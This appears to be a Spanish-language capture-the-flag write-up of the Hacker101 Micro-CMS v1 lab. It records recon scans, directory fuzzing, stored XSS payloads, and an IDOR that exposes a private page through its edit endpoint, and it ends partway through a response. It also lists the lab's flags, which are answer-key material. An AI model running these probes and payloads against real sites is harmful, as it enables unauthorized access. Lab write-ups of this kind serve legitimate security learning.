**Pentester:** Federico Leandro Cañellas
**Fecha:** 03-08-2025
**Nombre:** Micro-CMS v1
**Dificultad:** Easy
**Skills:** Web
**Flags:** 4

```
Stored XSS 1: ^FLAG^0ec0cf27b597a2f5f976a7c260031e1a3f355c5dcba5bc9a012d70550f9cdd20$FLAG$
Stored XSS 2: ^FLAG^d01d5e593c759398bdf0a63d8abfefff6d94c87337644afc7637b7f2b81c9418$FLAG$
SQLi: FLAG^6e95e97eb4bc6738b440562a9992f418449c11d172851a9b2323466ace0a8ccd$FLAG$
Broken Access Control,IDOR,Unauthorized Access: ^FLAG^ef1e891cb8ed7596cdbefe17afc9a2e4ac865eb368c084e5887555caf11f9b1b$FLAG$
```

URL de la máquina temporal: https://c2185aa9c020ec27aed9835fe5d78864.ctf.hacker101.com/

Revisión de DNS
```bash
<!-- @import "[TOC]" {cmd="toc" depthFrom=1 depthTo=6 orderedList=false} -->

dig short c2185aa9c020ec27aed9835fe5d78864.ctf.hacker101.com

; <<>> DiG 9.20.11 <<>> short c2185aa9c020ec27aed9835fe5d78864.ctf.hacker101.com
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NXDOMAIN, id: 20275
;; flags: qr rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 512
;; QUESTION SECTION:
;short.				IN	A

;; AUTHORITY SECTION:
.			3600	IN	SOA	a.root-servers.net. nstld.verisign-grs.com. 2025080300 1800 900 604800 86400

;; Query time: 13 msec
;; SERVER: 200.28.4.129#53(200.28.4.129) (UDP)
;; WHEN: Sun Aug 03 13:36:06 -04 2025
;; MSG SIZE  rcvd: 109

;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 12634
;; flags: qr rd ra; QUERY: 1, ANSWER: 3, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 512
;; QUESTION SECTION:
;c2185aa9c020ec27aed9835fe5d78864.ctf.hacker101.com. IN A

;; ANSWER SECTION:
c2185aa9c020ec27aed9835fe5d78864.ctf.hacker101.com. 28 IN CNAME	production-ctf-levels-58801822.us-west-2.elb.amazonaws.com.
production-ctf-levels-58801822.us-west-2.elb.amazonaws.com. 18 IN A 52.32.177.115
production-ctf-levels-58801822.us-west-2.elb.amazonaws.com. 18 IN A 35.163.206.90

;; Query time: 8 msec
;; SERVER: 200.28.4.129#53(200.28.4.129) (UDP)
;; WHEN: Sun Aug 03 13:36:06 -04 2025
;; MSG SIZE  rcvd: 180
```

**IPs de la máquina**
- 52.32.177.115
- 35.163.206.90

**Dominio**: `production-ctf-levels-58801822.us-west-2.elb.amazonaws.com`

**Consulta de servicios con nmap**
```bash
sudo nmap -sV -O 52.32.177.115 35.163.206.90

Starting Nmap 7.97 ( https://nmap.org ) at 2025-08-03 13:38 -0400
Nmap scan report for ec2-52-32-177-115.us-west-2.compute.amazonaws.com (52.32.177.115)
Host is up (0.22s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT    STATE SERVICE  VERSION
443/tcp open  ssl/http OpenResty web app server 1.27.1.2
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host

Nmap scan report for ec2-35-163-206-90.us-west-2.compute.amazonaws.com (35.163.206.90)
Host is up (0.22s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT    STATE SERVICE  VERSION
443/tcp open  ssl/http OpenResty web app server 1.27.1.2
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 2 IP addresses (2 hosts up) scanned in 63.23 seconds
```

**Observaciones**

Se observa un servicio en el puerto 443 llamado **OpenResty** en su versión `1.27.1.2`.

**OpenResty**

OpenResty v1.27.1.2 es una versión reciente y formal (publicada el 31 de marzo de 2025, anunciada el 30 de mayo de 2025) de la plataforma web OpenResty, que está basada en NGINX y LuaJIT.

**¿Qué es OpenResty?**

OpenResty es una plataforma web de alto rendimiento que integra:

- Un núcleo de NGINX optimizado
- El intérprete LuaJIT
- Módulos Lua escritos por OpenResty y de terceros,
- Librerías y dependencias cuidadosamente seleccionadas para construir aplicaciones web y APIs escalables.

Permite ejecutar lógica de backend escrita en Lua directamente dentro del servidor NGINX, apoyándose en su modelo de eventos no bloqueante para manejar múltiples conexiones con eficiencia.

**Componentes actualizados**
- OpenSSL actualizado de 3.0.15 a 3.4.1.
- PCRE actualizado a 10.44.
- lua-nginx-module (v 0.10.28):
- - Nueva función ngx.resp.set_status(status, reason).
- - Implementación ngx_http_lua_ffi_decode_base64mime.
- - Corrección: problema con setkeepalive en TLS 1.3 y límites fijos en subrequests HTTP/2.
- stream-lua-nginx-module (v 0.0.16)
- - Permite ngx.var en etapas de TLS como ssl_certificate_by_lua y ssl_client_hello_by_lua.
- - Soluciona setkeepalive en TLS 1.3.
- lua-resty-core (v 0.1.31): soporte para nuevas funciones base64 MIME y resp.set_status.
- LuaJIT 2.1‑20250117
- - Correcciones en manejo de BC_VARG, getfenv()/setfenv(), fugas de archivos, errores en MIPS64/ARM64, entre otros.

**Vulnerabilidades conocidas potenciales para OpenResty**

URL: https://app.opencve.io/cve/?vendor=openresty

- [CVE-2024-33452](https://app.opencve.io/cve/CVE-2024-33452): Severidad 7.7 Alta
- [CVE-2024-39702](https://app.opencve.io/cve/CVE-2024-39702): Severidad 5.9 Media
- [CVE-2020-36309](https://app.opencve.io/cve/CVE-2020-36309): Severidad 5.3 Media
- [CVE-2020-11724](https://app.opencve.io/cve/CVE-2020-11724): Severidad 7.5 Alta
- [CVE-2018-9230](https://app.opencve.io/cve/CVE-2018-9230): Severidad [No Disponible]

**Escaneo completo de puertos con nmap**

**IP:** 52.32.177.115

**Dominio**: ec2-52-32-177-115.us-west-2.compute.amazonaws.com

```bash
sudo sudo nmap -sV -p - 52.32.177.115

Starting Nmap 7.97 ( https://nmap.org ) at 2025-08-03 13:43 -0400
Nmap scan report for ec2-52-32-177-115.us-west-2.compute.amazonaws.com (52.32.177.115)
Host is up (0.21s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT    STATE SERVICE  VERSION
443/tcp open  ssl/http OpenResty web app server 1.27.1.2

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 424.81 seconds
```

**IP:** 35.163.206.9

**Dominio:** ec2-35-163-206-90.us-west-2.compute.amazonaws.com

```bash
sudo sudo nmap -sV -p - 35.163.206.9

Starting Nmap 7.97 ( https://nmap.org ) at 2025-08-03 14:11 -0400
Nmap scan report for ec2-35-163-206-90.us-west-2.compute.amazonaws.com (35.163.206.90)
Host is up (0.21s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT    STATE SERVICE  VERSION
443/tcp open  ssl/http OpenResty web app server 1.27.1.2

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 416.50 seconds
```

GET a la URL
```HTTP
GET / HTTP/1.1
Accept: */*
Accept-Encoding: gzip, deflate
Connection: keep-alive
Host: c2185aa9c020ec27aed9835fe5d78864.ctf.hacker101.com
User-Agent: HTTPie/3.2.4


HTTP/1.1 200 OK
Connection: keep-alive
Content-Length: 272
Content-Type: text/html; charset=utf-8
Date: Sun, 03 Aug 2025 15:37:02 GMT
Server: openresty/1.27.1.2

<!doctype html>
<html>
    <head>
        <title>Micro-CMS</title>
    </head>
    <body>
        <ul>
<li><a href="page/1">Testing</a></li>
<li><a href="page/2">Markdown Test</a></li>
        </ul>
        <a href="page/create">Create a new page</a>
    </body>
</html>
```

**Endpoints observados**
- /page/id
- /page/create

**Intento de LFI en URL base**
```bash
http -v GET "https://c2185aa9c020ec27aed9835fe5d78864.ctf.hacker101.com/../"
```

**Resultado**
```HTTP
GET / HTTP/1.1
Accept: */*
Accept-Encoding: gzip, deflate
Connection: keep-alive
Host: c2185aa9c020ec27aed9835fe5d78864.ctf.hacker101.com
User-Agent: HTTPie/3.2.4



HTTP/1.1 200 OK
Connection: keep-alive
Content-Length: 593
Content-Type: text/html; charset=utf-8
Date: Sun, 03 Aug 2025 17:28:18 GMT
Server: openresty/1.27.1.2

<!doctype html>
<html>
    <head>
        <title>Micro-CMS</title>
    </head>
    <body>
        <ul>
<li><a href="page/1"><script>alert("^FLAG^d01d5e593c759398bdf0a63d8abfefff6d94c87337644afc7637b7f2b81c9418$FLAG$");</script><script>alert(1);</script></a></li>
<li><a href="page/2">Markdown Test</a></li>
<li><a href="page/9"></a></li>
<li><a href="page/10"><script>alert("^FLAG^d01d5e593c759398bdf0a63d8abfefff6d94c87337644afc7637b7f2b81c9418$FLAG$");</script><form src='javascript:alert(1);'></a></li>
        </ul>
        <a href="page/create">Create a new page</a>
    </body>
</html>
```

**Flag encontrada**

`^FLAG^d01d5e593c759398bdf0a63d8abfefff6d94c87337644afc7637b7f2b81c9418$FLAG$`

**Nota:** La flag se encuentra después de haber ingresado un payload XSS en los campos de la página 1.

**Intento de acceso a `/.git/`**

```bash
http -v GET "https://c2185aa9c020ec27aed9835fe5d78864.ctf.hacker101.com/.git/"
```

```HTTP
GET /.git/ HTTP/1.1
Accept: */*
Accept-Encoding: gzip, deflate
Connection: keep-alive
Host: c2185aa9c020ec27aed9835fe5d78864.ctf.hacker101.com
User-Agent: HTTPie/3.2.4



HTTP/1.1 404 NOT FOUND
Connection: keep-alive
Content-Length: 207
Content-Type: text/html; charset=utf-8
Date: Sun, 03 Aug 2025 17:34:12 GMT
Server: openresty/1.27.1.2

<!doctype html>
<html lang=en>
<title>404 Not Found</title>
<h1>Not Found</h1>
<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
```

**Intento de acceso a `/.env`**
```HTTP
GET /.env HTTP/1.1
Accept: */*
Accept-Encoding: gzip, deflate
Connection: keep-alive
Host: c2185aa9c020ec27aed9835fe5d78864.ctf.hacker101.com
User-Agent: HTTPie/3.2.4



HTTP/1.1 404 NOT FOUND
Connection: keep-alive
Content-Length: 207
Content-Type: text/html; charset=utf-8
Date: Sun, 03 Aug 2025 18:22:00 GMT
Server: openresty/1.27.1.2

<!doctype html>
<html lang=en>
<title>404 Not Found</title>
<h1>Not Found</h1>
<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
```

**Fuzzing de directorios y archivos**

**Herramienta:** gobuster

**Diccionario:** `seclist/Discovery/Web-Content/common.txt`

```bash
gobuster dir -u "https://c2185aa9c020ec27aed9835fe5d78864.ctf.hacker101.com/" -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 20 -x php,html,txt,js -o gobuster-results.txt -r
```

**Sin resultados relevantes**

**Fuzzing de directorios y archivos recursivo**

**Herramienta**: ffuf

**Diccionario**: `seclists/Discovery/Web-Content/common.txt`

```bash
ffuf -u "https://9940c6abb8ba1a5fdb4cf8e5d48cdddc.ctf.hacker101.com/FUZZ" -w "/usr/share/seclists/Discovery/Web-Content/common.txt" -recursion -recursion-depth 2 -t 20
```
**Sin resultados relevantes**

**Análisis de `/page/create`**

GET
```HTTP
GET /page/create HTTP/1.1
Accept: */*
Accept-Encoding: gzip, deflate
Connection: keep-alive
Host: c2185aa9c020ec27aed9835fe5d78864.ctf.hacker101.com
User-Agent: HTTPie/3.2.4


HTTP/1.1 200 OK
Connection: keep-alive
Content-Length: 575
Content-Type: text/html; charset=utf-8
Date: Sun, 03 Aug 2025 15:38:58 GMT
Server: openresty/1.27.1.2

<!doctype html>
<html>
    <head>
        <title>Create page</title>
    </head>
    <body>
        <a href="../">&lt;-- Go Home</a>
        <h1>Create Page</h1>
        <form method="POST">
            Title: <input type="text" name="title"><br>
            <textarea name="body" rows="10" cols="80"></textarea><br>
            <input type="submit" value="Create">
            <div style="font-style: italic"><a href="https://github.com/adam-p/markdown-here/wiki/Markdown-Cheatsheet">Markdown</a> is supported, but scripts are not</div>
        </form>
    </body>
</html>
```

**Observaciones**

Existe un formulario en el mismo endpoint via POST. El form acepta markdown.

**Formulario de creación de página**

Campos: title, body

#### Pruebas al form `/page/create`

**Campos vacíos**
```HTTP
POST /page/create HTTP/1.1
Accept: */*
Accept-Encoding: gzip, deflate
Connection: keep-alive
Content-Length: 12
Content-Type: application/x-www-form-urlencoded; charset=utf-8
Host: c2185aa9c020ec27aed9835fe5d78864.ctf.hacker101.com
User-Agent: HTTPie/3.2.4

title=&body=


HTTP/1.1 302 FOUND
Connection: keep-alive
Content-Length: 201
Content-Type: text/html; charset=utf-8
Date: Sun, 03 Aug 2025 15:42:53 GMT
Location: /page/9
Server: openresty/1.27.1.2

<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/page/9">/page/9</a>. If not, click the link.
```

**XSS en campos del formulario**
```HTTP
POST /page/create HTTP/1.1
Accept: */*
Accept-Encoding: gzip, deflate
Connection: keep-alive
Content-Length: 114
Content-Type: application/x-www-form-urlencoded; charset=utf-8
Host: c2185aa9c020ec27aed9835fe5d78864.ctf.hacker101.com
User-Agent: HTTPie/3.2.4

title=%3Cform+src%3D%27javascript%3Aalert%281%29%3B%27%3E&body=%3Cform+src%3D%27javascript%3Aalert%281%29%3B%27%3E


HTTP/1.1 302 FOUND
Connection: keep-alive
Content-Length: 203
Content-Type: text/html; charset=utf-8
Date: Sun, 03 Aug 2025 15:44:47 GMT
Location: /page/10
Server: openresty/1.27.1.2

<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/page/10">/page/10</a>. If not, click the link.
```

**Observaciones**

En ambas pruebas se crean las páginas.

**Acceso a las páginas 9 y 10**

**Página id 9**
```HTTP
GET /page/9 HTTP/1.1
Accept: */*
Accept-Encoding: gzip, deflate
Connection: keep-alive
Host: c2185aa9c020ec27aed9835fe5d78864.ctf.hacker101.com
User-Agent: HTTPie/3.2.4


HTTP/1.1 200 OK
Connection: keep-alive
Content-Length: 210
Content-Type: text/html; charset=utf-8
Date: Sun, 03 Aug 2025 15:45:48 GMT
Server: openresty/1.27.1.2

<!doctype html>
<html>
    <head>
        <title></title>
    </head>
    <body>
        <a href="../">&lt;-- Go Home</a><br>
        <a href="edit/9">Edit this page</a>
        <h1></h1>

    </body>
</html>
```

**Página id 10**
```HTTP
GET /page/10 HTTP/1.1
Accept: */*
Accept-Encoding: gzip, deflate
Connection: keep-alive
Host: c2185aa9c020ec27aed9835fe5d78864.ctf.hacker101.com
User-Agent: HTTPie/3.2.4


HTTP/1.1 200 OK
Connection: keep-alive
Content-Length: 324
Content-Type: text/html; charset=utf-8
Date: Sun, 03 Aug 2025 15:46:46 GMT
Server: openresty/1.27.1.2

<!doctype html>
<html>
    <head>
        <title>&lt;form src='javascript:alert(1);'&gt;</title>
    </head>
    <body>
        <a href="../">&lt;-- Go Home</a><br>
        <a href="edit/10">Edit this page</a>
        <h1>&lt;form src='javascript:alert(1);'&gt;</h1>
<form src='javascrubbed:alert(1);'>
    </body>
</html>
```

**Observaciones**

- No se observa una inyección XSS para el payload `<form src='javascript:alert(1)'>`.
- Se encontró el endpoint GET `page/edit/id`.

**Intento de acceso a las páginas 1 a la 8**

Automatización para el acceso en bash
```bash
for i in {2..8}; do http -v GET "https://[HASH].ctf.hacker101.com/[ENDPOINT]/${i}" > "${i}.txt"; done
```

**Página id 1**
```HTTP
GET /page/1 HTTP/1.1
Accept: */*
Accept-Encoding: gzip, deflate
Connection: keep-alive
Host: c2185aa9c020ec27aed9835fe5d78864.ctf.hacker101.com
User-Agent: HTTPie/3.2.4


HTTP/1.1 200 OK
Connection: keep-alive
Content-Length: 275
Content-Type: text/html; charset=utf-8
Date: Sun, 03 Aug 2025 15:50:49 GMT
Server: openresty/1.27.1.2

<!doctype html>
<html>
    <head>
        <title>Testing</title>
    </head>
    <body>
        <a href="../">&lt;-- Go Home</a><br>
        <a href="edit/1">Edit this page</a>
        <h1>Testing</h1>
<h1>Woo</h1>
<p>Testing out this new micro-CMS!</p>
    </body>
</html>
```

**Intendo de acceso a edición**
```HTTP
GET /page/edit/1 HTTP/1.1
Accept: */*
Accept-Encoding: gzip, deflate
Connection: keep-alive
Host: c2185aa9c020ec27aed9835fe5d78864.ctf.hacker101.com
User-Agent: HTTPie/3.2.4



HTTP/1.1 200 OK
Connection: keep-alive
Content-Length: 624
Content-Type: text/html; charset=utf-8
Date: Sun, 03 Aug 2025 16:04:56 GMT
Server: openresty/1.27.1.2

<!doctype html>
<html>
    <head>
        <title>Edit page</title>
    </head>
    <body>
        <a href="../../">&lt;-- Go Home</a>
        <h1>Edit Page</h1>
        <form method="POST">
            Title: <input type="text" name="title" value="Testing"><br>
            <textarea name="body" rows="10" cols="80">#Woo
Testing out this new micro-CMS!</textarea><br>
            <input type="submit" value="Save">
            <div style="font-style: italic"><a href="https://github.com/adam-p/markdown-here/wiki/Markdown-Cheatsheet">Markdown</a> is supported, but scripts are not</div>
        </form>
    </body>
</html>
```

**Página id 2**
```HTTP
GET /page/2 HTTP/1.1
Accept: */*
Accept-Encoding: gzip, deflate
Connection: keep-alive
Host: c2185aa9c020ec27aed9835fe5d78864.ctf.hacker101.com
User-Agent: HTTPie/3.2.4


HTTP/1.1 200 OK
Connection: keep-alive
Content-Length: 469
Content-Type: text/html; charset=utf-8
Date: Sun, 03 Aug 2025 15:51:45 GMT
Server: openresty/1.27.1.2

<!doctype html>
<html>
    <head>
        <title>Markdown Test</title>
    </head>
    <body>
        <a href="../">&lt;-- Go Home</a><br>
        <a href="edit/2">Edit this page</a>
        <h1>Markdown Test</h1>
<p>Just testing some markdown functionality.</p>
<p><img alt="adorable kitten" src="https://static1.squarespace.com/static/54e8ba93e4b07c3f655b452e/t/56c2a04520c64707756f4267/1493764650017/" /></p>
<p><button>Some button</button></p>
    </body>
</html>
```

**Intendo de acceso a edición**
```HTTP
GET /page/edit/2 HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
User-Agent: HTTPie/3.2.4
Host: c2185aa9c020ec27aed9835fe5d78864.ctf.hacker101.com



HTTP/1.1 200 OK
Date: Sun, 03 Aug 2025 16:08:47 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 804
Connection: keep-alive
Server: openresty/1.27.1.2


<!doctype html>
<html>
    <head>
        <title>Edit page</title>
    </head>
    <body>
        <a href="../../">&lt;-- Go Home</a>
        <h1>Edit Page</h1>
        <form method="POST">
            Title: <input type="text" name="title" value="Markdown Test"><br>
            <textarea name="body" rows="10" cols="80">Just testing some markdown functionality.

![adorable kitten](https://static1.squarespace.com/static/54e8ba93e4b07c3f655b452e/t/56c2a04520c64707756f4267/1493764650017/)

&lt;button&gt;Some button&lt;/button&gt;</textarea><br>
            <input type="submit" value="Save">
            <div style="font-style: italic"><a href="https://github.com/adam-p/markdown-here/wiki/Markdown-Cheatsheet">Markdown</a> is supported, but scripts are not</div>
        </form>
    </body>
</html>
```

**GET al recurso de squarespace.com**
```HTTP
HTTP/1.1 404 Not Found
Accept-Ranges: bytes
Age: 29
Connection: keep-alive
Content-Encoding: gzip
Content-Length: 21
Content-Type: text/plain
Date: Sun, 03 Aug 2025 16:01:03 GMT
Server: Squarespace
Timing-Allow-Origin: *
Tracepoint: Fastly
Vary: Accept-Encoding
Via: 1.1 varnish, 1.1 varnish
X-Cache: MISS, HIT
X-Cache-Hits: 0, 1
X-Content-Type-Options: nosniff
X-Contextid: 75SUODsf/HEEdD1cy
X-Served-By: cache-dfw-kdfw8210113-DFW, cache-scl2220047-SCL
X-Timer: S1754236863.420977,VS0,VE1
```

**Pagina id 3**
```HTTP
GET /page/3 HTTP/1.1
Accept: */*
Accept-Encoding: gzip, deflate
Connection: keep-alive
Host: c2185aa9c020ec27aed9835fe5d78864.ctf.hacker101.com
User-Agent: HTTPie/3.2.4


HTTP/1.1 404 NOT FOUND
Connection: keep-alive
Content-Length: 207
Content-Type: text/html; charset=utf-8
Date: Sun, 03 Aug 2025 15:52:37 GMT
Server: openresty/1.27.1.2

<!doctype html>
<html lang=en>
<title>404 Not Found</title>
<h1>Not Found</h1>
<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
```

**Intendo de acceso a edición**
```HTTP
GET /page/edit/3 HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
User-Agent: HTTPie/3.2.4
Host: c2185aa9c020ec27aed9835fe5d78864.ctf.hacker101.com



HTTP/1.1 404 NOT FOUND
Date: Sun, 03 Aug 2025 16:08:49 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 207
Connection: keep-alive
Server: openresty/1.27.1.2

<!doctype html>
<html lang=en>
<title>404 Not Found</title>
<h1>Not Found</h1>
<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
```

**Página id 4**
```HTTP
GET /page/4 HTTP/1.1
Accept: */*
Accept-Encoding: gzip, deflate
Connection: keep-alive
Host: c2185aa9c020ec27aed9835fe5d78864.ctf.hacker101.com
User-Agent: HTTPie/3.2.4


HTTP/1.1 404 NOT FOUND
Connection: keep-alive
Content-Length: 207
Content-Type: text/html; charset=utf-8
Date: Sun, 03 Aug 2025 15:55:35 GMT
Server: openresty/1.27.1.2

<!doctype html>
<html lang=en>
<title>404 Not Found</title>
<h1>Not Found</h1>
<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
```

**Intendo de acceso a edición**
```HTTP
GET /page/edit/4 HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
User-Agent: HTTPie/3.2.4
Host: c2185aa9c020ec27aed9835fe5d78864.ctf.hacker101.com



HTTP/1.1 404 NOT FOUND
Date: Sun, 03 Aug 2025 16:08:50 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 207
Connection: keep-alive
Server: openresty/1.27.1.2

<!doctype html>
<html lang=en>
<title>404 Not Found</title>
<h1>Not Found</h1>
<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
```

**Página id 5**
```HTTP
GET /page/5 HTTP/1.1
Accept: */*
Accept-Encoding: gzip, deflate
Connection: keep-alive
Host: c2185aa9c020ec27aed9835fe5d78864.ctf.hacker101.com
User-Agent: HTTPie/3.2.4


HTTP/1.1 404 NOT FOUND
Connection: keep-alive
Content-Length: 207
Content-Type: text/html; charset=utf-8
Date: Sun, 03 Aug 2025 15:56:29 GMT
Server: openresty/1.27.1.2

<!doctype html>
<html lang=en>
<title>404 Not Found</title>
<h1>Not Found</h1>
<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
```

**Intendo de acceso a edición**
```HTTP
GET /page/edit/5 HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
User-Agent: HTTPie/3.2.4
Host: c2185aa9c020ec27aed9835fe5d78864.ctf.hacker101.com



HTTP/1.1 404 NOT FOUND
Date: Sun, 03 Aug 2025 16:08:52 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 207
Connection: keep-alive
Server: openresty/1.27.1.2

<!doctype html>
<html lang=en>
<title>404 Not Found</title>
<h1>Not Found</h1>
<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
```

**Página id 6**
```HTTP
GET /page/6 HTTP/1.1
Accept: */*
Accept-Encoding: gzip, deflate
Connection: keep-alive
Host: c2185aa9c020ec27aed9835fe5d78864.ctf.hacker101.com
User-Agent: HTTPie/3.2.4


HTTP/1.1 404 NOT FOUND
Connection: keep-alive
Content-Length: 207
Content-Type: text/html; charset=utf-8
Date: Sun, 03 Aug 2025 15:57:13 GMT
Server: openresty/1.27.1.2

<!doctype html>
<html lang=en>
<title>404 Not Found</title>
<h1>Not Found</h1>
<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
```

**Intendo de acceso a edición**
```HTTP
GET /page/edit/6 HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
User-Agent: HTTPie/3.2.4
Host: c2185aa9c020ec27aed9835fe5d78864.ctf.hacker101.com



HTTP/1.1 404 NOT FOUND
Date: Sun, 03 Aug 2025 16:08:54 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 207
Connection: keep-alive
Server: openresty/1.27.1.2

<!doctype html>
<html lang=en>
<title>404 Not Found</title>
<h1>Not Found</h1>
<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
```

**Página id 7**
```HTTP
GET /page/7 HTTP/1.1
Accept: */*
Accept-Encoding: gzip, deflate
Connection: keep-alive
Host: c2185aa9c020ec27aed9835fe5d78864.ctf.hacker101.com
User-Agent: HTTPie/3.2.4


HTTP/1.1 403 FORBIDDEN
Connection: keep-alive
Content-Length: 213
Content-Type: text/html; charset=utf-8
Date: Sun, 03 Aug 2025 15:57:52 GMT
Server: openresty/1.27.1.2

<!doctype html>
<html lang=en>
<title>403 Forbidden</title>
<h1>Forbidden</h1>
<p>You don&#39;t have the permission to access the requested resource. It is either read-protected or not readable by the server.</p>
```

**Consulta los métodos HTTP permitidos**
```HTTP
OPTIONS /page/7 HTTP/1.1
Accept: */*
Accept-Encoding: gzip, deflate
Connection: keep-alive
Host: c2185aa9c020ec27aed9835fe5d78864.ctf.hacker101.com
User-Agent: HTTPie/3.2.4



HTTP/1.1 200 OK
Allow: OPTIONS, HEAD, GET
Connection: keep-alive
Content-Length: 0
Content-Type: text/html; charset=utf-8
Date: Sun, 03 Aug 2025 18:26:48 GMT
Server: openresty/1.27.1.2
```

**Intendo de acceso a edición**
```HTTP
GET /page/edit/7 HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
User-Agent: HTTPie/3.2.4
Host: c2185aa9c020ec27aed9835fe5d78864.ctf.hacker101.com



HTTP/1.1 200 OK
Date: Sun, 03 Aug 2025 16:08:55 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 682
Connection: keep-alive
Server: openresty/1.27.1.2


<!doctype html>
<html>
    <head>
        <title>Edit page</title>
    </head>
    <body>
        <a href="../../">&lt;-- Go Home</a>
        <h1>Edit Page</h1>
        <form method="POST">
            Title: <input type="text" name="title" value="Private Page"><br>
            <textarea name="body" rows="10" cols="80">My secret is ^FLAG^ef1e891cb8ed7596cdbefe17afc9a2e4ac865eb368c084e5887555caf11f9b1b$FLAG$</textarea><br>
            <input type="submit" value="Save">
            <div style="font-style: italic"><a href="https://github.com/adam-p/markdown-here/wiki/Markdown-Cheatsheet">Markdown</a> is supported, but scripts are not</div>
        </form>
    </body>
</html>
```
**Flag encontrada**

`^FLAG^ef1e891cb8ed7596cdbefe17afc9a2e4ac865eb368c084e5887555caf11f9b1b$FLAG$`

**Intento de acceso a página protegida**

Se probaron los headers:
- `Authorization: Bearer <FLAG>`
- `Authorization: Basic <FLAG>`
- `Cookie: sessionid=<FLAG>`
- `Cookie: session=<FLAG>`
- `Cookie: connect.sid=<FLAG>`
- `Cookie: PHPSESSID=<FLAG>`
**Sin resultados**

**Intento de acceso a `/page/<FLAG>`**

```HTTP
GET /page/ef1e891cb8ed7596cdbefe17afc9a2e4ac865eb368c084e5887555caf11f9b1b HTTP/1.1
Accept: */*
Accept-Encoding: gzip, deflate
Connection: keep-alive
Host: c2185aa9c020ec27aed9835fe5d78864.ctf.hacker101.com
User-Agent: HTTPie/3.2.4



HTTP/1.1 404 NOT FOUND
Connection: keep-alive
Content-Length: 207
Content-Type: text/html; charset=utf-8
Date: Sun, 03 Aug 2025 18:33:00 GMT
Server: openresty/1.27.1.2

<!doctype html>
<html lang=en>
<title>404 Not Found</title>
<h1>Not Found</h1>
<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
```

**Página id 8**

```HTTP
GET /page/8 HTTP/1.1
Accept: */*
Accept-Encoding: gzip, deflate
Connection: keep-alive
Host: c2185aa9c020ec27aed9835fe5d78864.ctf.hacker101.com
User-Agent: HTTPie/3.2.4


HTTP/1.1 404 NOT FOUND
Connection: keep-alive
Content-Length: 207
Content-Type: text/html; charset=utf-8
Date: Sun, 03 Aug 2025 15:58:28 GMT
Server: openresty/1.27.1.2

<!doctype html>
<html lang=en>
<title>404 Not Found</title>
<h1>Not Found</h1>
<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
```

**Intendo de acceso a edición**
```HTTP
GET /page/edit/8 HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
User-Agent: HTTPie/3.2.4
Host: c2185aa9c020ec27aed9835fe5d78864.ctf.hacker101.com



HTTP/1.1 404 NOT FOUND
Date: Sun, 03 Aug 2025 16:08:57 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 207
Connection: keep-alive
Server: openresty/1.27.1.2

<!doctype html>
<html lang=en>
<title>404 Not Found</title>
<h1>Not Found</h1>
<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
```

**Testeo de parámetro `id` en GET `/page/edit/id`**

**Parámetro vacío**
```HTTP
GET /page/edit/ HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
User-Agent: HTTPie/3.2.4
Host: c2185aa9c020ec27aed9835fe5d78864.ctf.hacker101.com



HTTP/1.1 404 NOT FOUND
Date: Sun, 03 Aug 2025 16:12:42 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 207
Connection: keep-alive
Server: openresty/1.27.1.2

<!doctype html>
<html lang=en>
<title>404 Not Found</title>
<h1>Not Found</h1>
